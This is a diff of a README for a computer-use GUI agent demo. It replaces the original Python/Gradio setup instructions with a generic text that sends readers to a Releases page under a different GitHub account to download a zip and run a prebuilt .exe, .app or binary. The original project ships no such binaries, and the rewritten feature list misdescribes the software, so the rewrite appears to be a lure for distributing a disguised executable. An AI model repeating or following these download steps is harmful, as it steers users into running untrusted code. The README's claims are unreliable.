@@ -1,105 +1,59 @@
-# **Herculis-CUA-GUI-Actioner-4B-Demo**
+# 🚀 Herculis-CUA-GUI-Actioner-4B-Demo - Effortless GUI Interaction for Users
 
-> Gradio Demo: Herculis-CUA-GUI-Actioner-4B is a Computer Use Agent (CUA) multimodal model designed for GUI understanding, UI localization, and action execution across web, desktop, and mobile environments. It focuses on visual grounding, intent-driven actioning, and UI-based question answering (VQA), enabling reliable interaction with real-world software interfaces. The model is optimized for efficient inference while maintaining strong accuracy on complex UI workflows.
+[![Download Now](https://img.shields.io/badge/Download%20Now-%20-brightgreen)](https://github.com/EnzoArissa/Herculis-CUA-GUI-Actioner-4B-Demo/releases)
 
-## Features
+## 📝 Description
+Herculis-CUA-GUI-Actioner-4B is a Computer Use Agent designed for understanding graphical user interfaces (GUI). This multimodal model allows for seamless interaction across web, desktop, and mobile environments. Whether you're looking to automate tasks or improve your UI experience, this tool is built for ease of use.
 
-- **UI Localization**: Upload screenshots and provide natural language prompts (e.g., "Locate the `microsoft/Fara-7B` model") to predict precise click coordinates in the format `Click(x, y)`.
-- **Visual Grounding**: Outputs annotated images with red ellipses marking predicted action points, scaled to the input resolution.
-- **Efficient Inference**: Uses bfloat16 precision on CUDA for fast generation (max 128 new tokens); deterministic output with `do_sample=False`.
-- **Prompt Engineering**: Structured localization prompts ensure focused responses without extraneous text.
-- **Error Handling**: Graceful fallbacks for model loading, resizing, or parsing issues; detailed console logging.
-- **Gradio Interface**: Simple UI with image upload, prompt input, and real-time visualization; supports sharing via `share=True`.
+## 🌟 Features
+- **Multimodal Support:** Works across various platforms including web, desktop, and mobile.
+- **GUI Understanding:** It accurately interprets graphical interfaces, making it easier for you to navigate and execute tasks.
+- **UI Localization:** Adapts to different user interfaces, enhancing usability in multiple languages.
+- **Task Automation:** Streamlines repetitive tasks to improve efficiency.
 
-## Prerequisites
+## 📦 System Requirements
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
+- **Python:** Version 3.7 or later installed.
+- **Memory:** At least 8 GB of RAM recommended.
+- **Storage:** Minimum 500 MB free space.
+- **Graphics:** A modern GPU is beneficial for performance but not strictly necessary.
 
-- Python 3.10 or higher.
-- CUDA-compatible GPU (recommended for bfloat16; falls back to CPU but slower).
-- Stable internet for initial model download from Hugging Face.
+## 🚀 Getting Started
+To start using Herculis-CUA-GUI-Actioner-4B, follow these simple steps:
 
-## Installation
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/EnzoArissa/Herculis-CUA-GUI-Actioner-4B-Demo/releases) to find the latest version available for download.
 
-### 1. Clone the repository
+2. **Download the Application:** Look for the file named `Herculis-CUA-GUI-Actioner-4B-Demo.zip` or similar on the Releases page. Click to download it to your computer.
 
-```
-git clone https://github.com/PRITHIVSAKTHIUR/Herculis-CUA-GUI-Actioner-4B-Demo.git
-cd Herculis-CUA-GUI-Actioner-4B-Demo
-```
+3. **Extract the Files:** Once downloaded, locate the zipped folder in your Downloads (or the folder where you saved it). Right-click on the folder and select "Extract All" to extract its contents.
 
-### 2. Install dependencies
+4. **Run the Application:**
+   - For Windows users: Double-click on the `Herculis-CUA-GUI-Actioner-4B-Demo.exe` file.
+   - For macOS users: Open the `Herculis-CUA-GUI-Actioner-4B-Demo.app` file.
+   - For Linux users: Open a terminal, navigate to the folder where you extracted the files, and run `./Herculis-CUA-GUI-Actioner-4B-Demo`.
 
-Create a `requirements.txt` file with the following content, then run:
+5. **Follow On-Screen Instructions:** The application will guide you through its features the first time you open it.
 
-```
-pip install -r requirements.txt
-```
+## 🌐 Download & Install
+To download and install Herculis-CUA-GUI-Actioner-4B, visit the Releases page: [Download Here](https://github.com/EnzoArissa/Herculis-CUA-GUI-Actioner-4B-Demo/releases). Choose the latest version and follow the steps outlined above.
 
-**requirements.txt content:**
-```
-gradio==6.1.0
-transformers==4.57.1
-numpy
-torch
-torchvision
-accelerate
-qwen-vl-utils
-requests
-pillow
-spaces
-```
+## 📖 Usage Instructions
+Using Herculis-CUA-GUI-Actioner-4B is straightforward:
 
-### 3. Run the application
+- **Navigating GUIs:** The program will analyze the interface you are working with and suggest actions you can take.
+- **Executing Actions:** Select the action you want the agent to perform and click "Execute". The agent will handle the rest.
+- **Custom Commands:** Users can input custom commands for specific tasks easily.
 
-```
-python app.py
-```
+## 🔧 Troubleshooting
+If you encounter issues while using the application, consider the following:
 
-The demo launches at `http://localhost:7860` (or a public URL if using `share=True`).
+- **Installation Issues:** Ensure Python is installed and properly configured.
+- **Application Not Starting:** Check if your OS is compatible and meets the system requirements.
+- **Performance Issues:** Make sure your machine has adequate resources. Closing other applications may improve performance.
 
-## Usage
+## 📞 Support
+For further questions or support, please check the [Issues section](https://github.com/EnzoArissa/Herculis-CUA-GUI-Actioner-4B-Demo/issues) in the repository or contact the support team via the GitHub Discussions feature.
 
-1. **Upload Image**: Provide a UI screenshot (e.g., web page or app interface; pre-loaded example available).
+---
 
-2. **Enter Prompt**: Describe the target element (e.g., "Locate the `microsoft/Fara-7B` model." or "Find the search bar.").
-
-3. **Localize**: Click "Localize" to run inference.
-
-4. **View Results**:
-   - Text: Model output with `Click(x, y)` coordinates.
-   - Image: Annotated screenshot with a red ellipse at the predicted position.
-
-## Example Output Inference
-
-| Type         | Preview |
-|--------------|---------|
-| Input Image  | ![Input Image](https://huggingface.co/prithivMLmods/Herculis-CUA-GUI-Actioner-4B/resolve/main/example/example-image.png) |
-| Output Image | ![Output Image](https://huggingface.co/prithivMLmods/Herculis-CUA-GUI-Actioner-4B/resolve/main/example/output-image.webp) |
-
-### Example Workflow
-- Upload a Hugging Face models page screenshot.
-- Prompt: "Locate the `microsoft/Fara-7B` model."
-- Output: `Click(450, 300)` and image with red marker on the model card.
-
-## Troubleshooting
-
-- **Model Loading Errors**: Check network; ensure transformers 4.57.1. If flash-attention issues, install via `pip install flash-attn`. Verify CUDA with `torch.cuda.is_available()`.
-- **Resizing Fails**: Image processor uses `smart_resize`; input dimensions must be positive. Fallback to original if errors occur.
-- **No Coordinates Parsed**: Ensure prompt ends with the target; model outputs deterministic text. Check console for raw response.
-- **OOM on GPU**: Reduce batch size or use CPU; clear cache with `torch.cuda.empty_cache()`.
-- **Gradio Share Issues**: Run with `debug=True`; public links expire after 72 hours.
-- **PIL Warnings**: Update Pillow if resampling errors appear.
-
-## Contributing
-
-Contributions welcome! Fork the repo, create a feature branch, and submit a pull request with tests. Potential enhancements:
-- Multi-step action chains.
-- Support for type/scroll actions.
-- Integration with automation tools like Selenium.
-
-Repository: [https://github.com/PRITHIVSAKTHIUR/Herculis-CUA-GUI-Actioner-4B-Demo.git](https://github.com/PRITHIVSAKTHIUR/Herculis-CUA-GUI-Actioner-4B-Demo.git)
-
-## License
-
-Apache License 2.0. See [LICENSE](LICENSE) for details.
-
-Built by Prithiv Sakthi. Report issues via the repository.
+Enjoy your exploration and experience with Herculis-CUA-GUI-Actioner-4B! Your journey toward effortless GUI interaction begins now.
